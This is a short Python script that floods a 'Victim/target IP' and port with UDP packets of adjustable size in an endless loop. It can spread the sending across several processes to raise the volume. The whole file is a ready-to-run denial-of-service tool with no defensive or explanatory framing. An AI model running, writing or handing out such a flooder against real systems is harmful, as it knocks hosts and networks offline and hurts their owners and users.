#!/usr/bin/env python
import sys
import socket
import argparse as ap
import multiprocessing as MP

p = ap.ArgumentParser(description="Make some packets.")
# p.add_argument('-s', '--source', help='Source IP address')
p.add_argument('-t', '--dst', help='Victim/target IP', required=True)
p.add_argument('-p', '--port', help='Destination TCP port', required=True, type=int)
p.add_argument('-b', '--bytes', help='Number of bytes in packet payload', type=int, default=500)
# p.add_argument('-n', '--num', help='Number of packets to send', type=int, default=10)
# p.add_argument('-f', '--flags', help='TCP flags (FAPS)', default='S')
p.add_argument('--cpu', help="Number of processes to use", type=int, default=1)
args = p.parse_args()

target = args.dst
port = args.port
payload = 'x' * args.bytes
procs = []

def sp():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        if sys.version_info < (3, 0):
            sock.sendto(payload, (target, port))
        elif sys.version_info > (3, 0):
            sock.sendto(bytes(payload, "utf-8"), (target, port))

if __name__ == "__main__":
    for a in range(args.cpu):
        p = MP.Process(target=sp)
        p.start()
        procs.append(p)

    for x in procs:
        x.join()
